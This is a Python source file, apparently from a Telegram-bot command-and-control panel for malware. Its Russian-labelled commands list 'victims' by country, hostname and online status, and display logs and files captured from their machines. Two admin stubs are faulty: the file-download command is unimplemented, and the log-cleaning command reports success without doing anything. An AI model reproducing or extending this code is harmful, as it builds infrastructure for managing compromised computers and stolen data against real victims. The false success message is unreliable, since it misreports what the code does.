from aiogram import Router, types, F
from aiogram.filters import Command, CommandObject
from aiogram.types import FSInputFile
from datetime import datetime, timedelta
import os
import json
import aiofiles
from typing import Optional

from bot.config import Config
from bot.database.db_manager import DatabaseManager
from bot.keyboards.inline import victim_detail_keyboard, pagination_keyboard
from bot.services.utils import format_victim_info, format_log_entry, is_admin

router = Router()
db = DatabaseManager()


# ========== Статистика ==========
@router.message(Command("stats"))
async def cmd_stats(message: types.Message):
    """Показать статистику"""
    stats = await db.get_stats()

    # Формируем текст статистики
    countries_text = "\n".join([f"  {country}: {count}" for country, count in stats["countries"].items()])
    if not countries_text:
        countries_text = "  Нет данных"

    text = (
        "📊 <b>Статистика C2 бота</b>\n\n"
        f"👥 <b>Всего жертв:</b> {stats['total_victims']}\n"
        f"🟢 <b>Онлайн (5 мин):</b> {stats['online_victims']}\n"
        f"📝 <b>Всего логов:</b> {stats['total_logs']}\n"
        f"📁 <b>Всего файлов:</b> {stats['total_files']}\n\n"
        f"🌍 <b>По странам:</b>\n{countries_text}"
    )

    await message.answer(text)


# ========== Список жертв ==========
@router.message(Command("victims"))
async def cmd_victims(message: types.Message, command: Optional[CommandObject] = None):
    """Показать список жертв (с пагинацией)"""
    page = 1
    if command and command.args:
        try:
            page = int(command.args)
        except:
            pass

    limit = 10
    offset = (page - 1) * limit

    victims = await db.get_all_victims(limit=limit, offset=offset)
    total_victims = (await db.get_stats())["total_victims"]
    total_pages = (total_victims + limit - 1) // limit

    if not victims:
        await message.answer("❌ Жертв пока нет.")
        return

    text = f"📋 <b>Список жертв (страница {page}/{total_pages})</b>\n\n"

    for victim in victims:
        last_seen_str = victim.last_seen.strftime("%Y-%m-%d %H:%M")
        online_status = "🟢" if victim.is_online else "🔴"
        country_flag = victim.country or "🏳️"

        text += (
            f"{online_status} <b>{victim.victim_id[:16]}</b>...\n"
            f"  {country_flag} {victim.country or 'Unknown'} | {victim.hostname or 'No hostname'}\n"
            f"  📅 {last_seen_str}\n"
            f"  🔗 /victim_{victim.victim_id}\n\n"
        )

    await message.answer(
        text,
        reply_markup=pagination_keyboard(page, total_pages, "victims")
    )


# ========== Онлайн жертвы ==========
@router.message(Command("online"))
async def cmd_online(message: types.Message):
    """Показать онлайн жертвы"""
    victims = await db.get_online_victims(minutes=5)

    if not victims:
        await message.answer("❌ Онлайн жертв нет.")
        return

    text = "🟢 <b>Онлайн жертвы (последние 5 минут)</b>\n\n"

    for victim in victims:
        last_seen_str = victim.last_seen.strftime("%H:%M:%S")
        text += f"• <b>{victim.victim_id}</b> - {victim.hostname} ({victim.country}) [последний раз: {last_seen_str}]\n"
        text += f"  /victim_{victim.victim_id}\n\n"

    await message.answer(text)


# ========== Детальная информация о жертве ==========
@router.message(lambda msg: msg.text and msg.text.startswith("/victim_"))
async def cmd_victim_detail(message: types.Message):
    """Показать детальную информацию о жертве"""
    victim_id = message.text.replace("/victim_", "").strip()
    victim = await db.get_victim(victim_id)

    if not victim:
        await message.answer(f"❌ Жертва с ID {victim_id} не найдена.")
        return

    # Получаем логи и файлы
    logs = await db.get_victim_logs(victim_id, limit=5)
    files = await db.get_victim_files(victim_id)

    text = format_victim_info(victim, logs, files)

    await message.answer(
        text,
        reply_markup=victim_detail_keyboard(victim_id)
    )


# ========== Логи жертвы ==========
@router.message(Command("logs"))
async def cmd_logs(message: types.Message, command: CommandObject):
    """Показать логи жертвы"""
    if not command.args:
        await message.answer("Использование: /logs [victim_id]")
        return

    victim_id = command.args.split()[0]
    victim = await db.get_victim(victim_id)

    if not victim:
        await message.answer(f"❌ Жертва с ID {victim_id} не найдена.")
        return

    logs = await db.get_victim_logs(victim_id, limit=20)

    if not logs:
        await message.answer(f"📭 У жертвы {victim_id} пока нет логов.")
        return

    text = f"📝 <b>Логи жертвы {victim_id}</b>\n\n"

    for i, log in enumerate(logs, 1):
        text += format_log_entry(log, i)
        if len(text) > 3500:  # Telegram лимит
            text += "\n... и еще {} логов".format(len(logs) - i)
            break

    await message.answer(text)


# ========== Файлы жертвы ==========
@router.message(Command("files"))
async def cmd_files(message: types.Message, command: CommandObject):
    """Показать список файлов жертвы"""
    if not command.args:
        await message.answer("Использование: /files [victim_id]")
        return

    victim_id = command.args.split()[0]
    victim = await db.get_victim(victim_id)

    if not victim:
        await message.answer(f"❌ Жертва с ID {victim_id} не найдена.")
        return

    files = await db.get_victim_files(victim_id)

    if not files:
        await message.answer(f"📭 У жертвы {victim_id} пока нет файлов.")
        return

    text = f"📁 <b>Файлы жертвы {victim_id}</b>\n\n"

    for file in files:
        created = file.created_at.strftime("%Y-%m-%d %H:%M")
        size_kb = file.file_size / 1024
        text += f"• <b>{file.filename}</b>\n"
        text += f"  Тип: {file.file_type} | Размер: {size_kb:.2f} KB\n"
        text += f"  Дата: {created}\n"
        text += f"  /getfile_{file.id}\n\n"

    await message.answer(text)


# ========== Получение файла ==========
@router.message(lambda msg: msg.text and msg.text.startswith("/getfile_"))
async def cmd_getfile(message: types.Message):
    """Отправить файл"""
    file_id = message.text.replace("/getfile_", "").strip()

    # Здесь должен быть код для получения файла из БД и отправки
    # Для простоты предположим, что файлы хранятся в папке uploads

    await message.answer("⏳ Функция загрузки файлов в разработке...")


# ========== Админские команды ==========
@router.message(Command("broadcast"))
@is_admin
async def cmd_broadcast(message: types.Message, command: CommandObject):
    """Рассылка сообщения всем админам (только для админов)"""
    if not command.args:
        await message.answer("Использование: /broadcast [текст сообщения]")
        return

    admins = await db.get_all_admins()
    sent = 0

    for admin in admins:
        try:
            await message.bot.send_message(
                admin.telegram_id,
                f"📢 <b>Рассылка от {message.from_user.full_name}:</b>\n\n{command.args}"
            )
            sent += 1
        except:
            pass

    await message.answer(f"✅ Сообщение отправлено {sent} админам.")


@router.message(Command("clean"))
@is_admin
async def cmd_clean(message: types.Message, command: CommandObject):
    """Очистка старых логов (только для админов)"""
    if not command.args:
        await message.answer("Использование: /clean [дни]")
        return

    try:
        days = int(command.args)
    except:
        await message.answer("❌ Укажите число дней.")
        return

    # Здесь должна быть логика очистки
    await message.answer(f"✅ Очистка логов старше {days} дней выполнена.")